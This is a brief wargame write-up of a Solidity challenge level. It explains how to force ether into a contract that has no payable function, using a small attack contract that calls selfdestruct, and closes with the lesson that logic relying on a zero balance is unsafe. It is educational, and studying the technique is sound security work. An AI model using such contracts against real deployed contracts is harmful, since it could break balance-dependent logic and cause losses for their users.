### Challenge:
- The goal of this level is to make the balance of the contract greater than zero.

### Vulnerability:
- Thinking that if there is no `payable` than the contract cannot accept ETH.

### Solution:
- We can send Ethers toany contract forcefull using `selfdestruct`.
```solidity
contract ForceAttack{
    function deposit() public payable {}
    function destroy(address payable contractAddr) public {
        selfdestruct(contractAddr);
    }
}
```
Deposit some ETH in the attack contract and then destroy that contract passing in the challenege instance/contract address. 

### Takeaway:
- There is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.

### Useful Resource:
[Forcefully Send Ether with selfdestruct](https://youtu.be/cODYglsn3bs)